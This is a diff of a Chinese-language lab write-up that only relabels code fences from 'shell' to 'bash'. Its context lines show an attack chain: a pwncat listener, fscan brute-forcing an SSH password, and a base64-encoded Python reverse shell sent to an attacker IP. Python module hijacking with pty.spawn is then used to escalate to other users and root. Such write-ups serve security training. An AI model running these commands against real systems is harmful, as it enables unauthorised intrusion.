@@ -175,7 +175,7 @@ csrfmiddlewaretoken=8sIxi3DjITlwk9AQtXq37xpboAzzCPdeK0v62fIcPxBfOZycHOJx29lEkp0y
 
 ## User - Docker - root
 
-```shell
+```bash
 ┌─[✗]─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
 [17:34:56] Welcome to pwncat 🐈!
@@ -206,7 +206,7 @@ root
 
 ### 命令行历史
 
-```shell title="/root/.bash_history"
+```bash title="/root/.bash_history"
 ssh ramsey@172.17.0.1
 ```
 
@@ -229,7 +229,7 @@ Password: pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1p
 
 首先，直接在 Docker 容器内部署 [shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。](https://github.com/shadow1ng/fscan)
 
-```shell
+```bash
 (local) pwncat$ upload ./tools/fscan
 ./fscan ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 6.3/6.3 MB • 1.7 MB/s • 0:00:00
 [20:59:58] uploaded 6.27MiB in 4.03 seconds
@@ -237,7 +237,7 @@ Password: pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1p
 
 然后指定用户名为 `ramsey`，开始扫描
 
-```shell
+```bash
 (remote) root@8b39a559b296:/root# ./fscan -h 172.17.0.1 -user ramsey
 
    ___                              _
@@ -265,7 +265,7 @@ ramsey:12345678
 
 由于靶机上并未部署 SSH 客户端，所以采用 fscan 内置的命令执行功能
 
-```shell
+```bash
 (remote) root@8b39a559b296:/root# ./fscan -h 172.17.0.1 -user ramsey -pwd "12345678" -c "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTYuMTAyIiw4ODg4KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIikn | base64 -d | bash"
 
 ┌─[randark@parrot]─[~]
@@ -286,7 +286,7 @@ Unb4ked_W00tw00t
 
 ### 环境探测
 
-```shell
+```bash
 (remote) ramsey@unbaked:/home/ramsey$ sudo -l
 [sudo] password for ramsey:
 Matching Defaults entries for ramsey on unbaked:
@@ -433,7 +433,7 @@ pty.spawn("/bin/bash")
 
 ## User - oliver
 
-```shell
+```bash
 (remote) ramsey@unbaked:/home/ramsey$ touch pytesseract.py
 (remote) ramsey@unbaked:/home/ramsey$ echo "import pty" > pytesseract.py
 (remote) ramsey@unbaked:/home/ramsey$ echo 'pty.spawn("/bin/bash")' >> pytesseract.py
@@ -444,7 +444,7 @@ oliver
 
 ### 环境探测
 
-```shell
+```bash
 oliver@unbaked:~$ sudo -l
 Matching Defaults entries for oliver on unbaked:
     env_reset, mail_badpass,
@@ -472,7 +472,7 @@ client.containers.run("python-django:latest", "sleep infinity", detach=True)
 
 ## User - root
 
-```shell
+```bash
 oliver@unbaked:/home/oliver$ touch /tmp/docker.py
 oliver@unbaked:/home/oliver$ echo "import pty" >> /tmp/docker.py
 oliver@unbaked:/home/oliver$ echo 'pty.spawn("/bin/bash")' >> /tmp/docker.py
